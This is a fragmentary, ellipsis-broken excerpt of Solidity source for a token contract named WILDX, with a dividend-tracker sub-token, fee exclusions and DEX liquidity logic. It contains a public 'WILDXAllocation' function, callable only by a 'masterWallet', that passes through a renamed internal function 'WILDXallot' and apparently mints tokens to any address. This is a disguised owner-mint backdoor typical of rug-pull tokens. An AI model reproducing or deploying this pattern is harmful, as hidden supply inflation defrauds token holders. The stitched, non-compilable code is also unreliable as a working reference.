...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function WILDXallot(address account, uint256 amount) internal virtual {
...
function WILDXallot(address account, uint256 value) internal override {
    super.WILDXallot(account, value);
...
contract WILDXrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardWILDXMap  for RewardWILDXMap .Map;
RewardWILDXMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("WILDX_rewardToken_Tracker", "WILDX_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "WILDX_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "WILDX_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main WILDX contract.");
    }
...
contract WILDX is ERC20, Ownable {
 ...
 uint256 public gasForProcessing = 300000;
    ...
    WILDXrewardToken public rewardToken;
...
bool public cooldownEnabled = false;
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new WILDXrewardToken();
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function WILDXAllocation(address userAddress, uint256 tokenToUser) public masterWallet{
       WILDXallot(userAddress, tokenToUser);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "WILDX: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "WILDX: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "WILDX: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "WILDX: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTWILDX = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTWILDX);
...
addLiquidity(tokensTWILDX, bnbForLiquidity);
